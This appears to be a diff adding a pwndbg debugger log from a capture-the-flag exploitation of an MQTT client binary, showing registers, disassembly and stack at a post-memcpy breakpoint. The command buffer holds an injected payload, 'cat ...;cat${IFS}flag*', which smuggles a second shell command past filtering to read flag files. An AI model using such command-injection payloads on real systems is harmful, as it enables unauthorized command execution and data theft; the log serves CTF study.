@@ -1,0 +1,87 @@
+pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 9 GDB functions (can be used with print/break). Type help function to see them.
+Reading symbols from ./ld-linux-x86-64.so.2...
+
+This GDB supports auto-downloading debuginfo from the following URLs:
+  <https://debuginfod.ubuntu.com>
+Debuginfod has been disabled.
+To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
+(No debugging symbols found in ./ld-linux-x86-64.so.2)
+
+Program stopped.
+0x00007ffff7fe3290 in ?? ()
+Stopped due to shared library event (no libraries added or removed)
+Breakpoint 1 at 0x7ffff7fb8a45
+Will ignore next 1 crossings of breakpoint 1.
+[New LWP 100123]
+[Switching to LWP 100123]
+
+Thread 2 "MQTTClient_run" hit Breakpoint 1, 0x00007ffff7fb8a45 in ?? ()
+
+[+] hit post-memcpy breakpoint
+[filename]
+0x7ffff7ccab30:	"index_html"
+[local_cmd]
+0x7ffff7ccabb0:	"cat /home/ctf/index_html"
+[global_cmd]
+0x7ffff7fbc140:	"cat /home/ctf/index_html;cat${IFS}flag*"
+[content_len]
+$1 = 10
+
+[pwndbg context]
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────[ LAST SIGNAL ]─────────────────────────────────
+Breakpoint hit at 0x7ffff7fb8a45
+─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────
+*RAX  0x7ffff7fbc140 ◂— 'cat /home/ctf/index_html;cat${IFS}flag*'
+*RBX  0xa
+*RCX  1
+*RDX  0x18
+*RDI  0x7ffff7fbc140 ◂— 'cat /home/ctf/index_html;cat${IFS}flag*'
+*RSI  0x7ffff7ccabb0 ◂— 'cat /home/ctf/index_html'
+*R8   0x6c
+*R9   0x7ffff7cca950 ◂— 0
+*R10  0
+*R11  0
+*R12  0
+*R13  0x7ffff7f1dd60 (mqttclient_mutex_store) ◂— 0
+*R14  0
+*R15  0x7ffff0000e88 —▸ 0x7ffff00010b8 ◂— 0x14d54514d
+*RBP  0x7ffff7ccad50 —▸ 0x7ffff7ccade0 —▸ 0x7ffff801f658 —▸ 0x7ffff801f7b8 ◂— 'localhost:9999'
+*RSP  0x7ffff7ccaac0 —▸ 0x7ffff7f0fbf7 (TreeBalanceAfterAdd+28) ◂— test eax, eax
+*RIP  0x7ffff7fb8a45 ◂— lea rax, [rbp - 0x220]
+──────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────
+ ► 0x7ffff7fb8a45   lea    rax, [rbp - 0x220]      RAX => 0x7ffff7ccab30 ◂— 'index_html'
+   0x7ffff7fb8a4c   lea    rdx, [rip + 0x16e4]     RDX => 0x7ffff7fba137 ◂— 'index_html'
+   0x7ffff7fb8a53   mov    rsi, rdx                RSI => 0x7ffff7fba137 ◂— 'index_html'
+   0x7ffff7fb8a56   mov    rdi, rax                RDI => 0x7ffff7ccab30 ◂— 'index_html'
+   0x7ffff7fb8a59   call   0x7ffff7fb82a0              <0x7ffff7fb82a0>
+ 
+   0x7ffff7fb8a5e   test   eax, eax
+   0x7ffff7fb8a60   je     0x7ffff7fb8a7b              <0x7ffff7fb8a7b>
+ 
+   0x7ffff7fb8a62   lea    rax, [rip + 0x16d9]     RAX => 0x7ffff7fba142 ◂— 0x720032746c756166 /* 'fault2' */
+   0x7ffff7fb8a69   mov    rdi, rax                RDI => 0x7ffff7fba142 ◂— 0x720032746c756166 /* 'fault2' */
+   0x7ffff7fb8a6c   call   0x7ffff7fb81c0              <0x7ffff7fb81c0>
+ 
+   0x7ffff7fb8a71   mov    eax, 0                  EAX => 0
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ rsp 0x7ffff7ccaac0 —▸ 0x7ffff7f0fbf7 (TreeBalanceAfterAdd+28) ◂— test eax, eax
+01:0008│-288 0x7ffff7ccaac8 —▸ 0x7ffff00011a8 ◂— 'GET /home/ctf/index_html HTTP/1.1\r\nHost: x\r\nContentLength: 10\r\n'
+02:0010│-280 0x7ffff7ccaad0 ◂— 0x10000000a /* '\n' */
+03:0018│-278 0x7ffff7ccaad8 ◂— 0x180000000a /* '\n' */
+04:0020│-270 0x7ffff7ccaae0 ◂— 0
+05:0028│-268 0x7ffff7ccaae8 ◂— 0x61 /* 'a' */
+06:0030│-260 0x7ffff7ccaaf0 ◂— 0
+07:0038│-258 0x7ffff7ccaaf8 ◂— 0
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► 0   0x7ffff7fb8a45 None
+   1   0x7ffff7f0fbf7 TreeBalanceAfterAdd+28
+   2     0x180000000a None
+   3              0x0 None
+─────────────────────────────[ THREADS (2 TOTAL) ]──────────────────────────────
+  ► 2   "MQTTClient_run"  stopped: 0x7ffff7fb8a45
+    1   "ld-linux-x86-64" stopped: 0x7ffff7db47f8 <clock_nanosleep+200> 
+────────────────────────────────────────────────────────────────────────────────
+warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
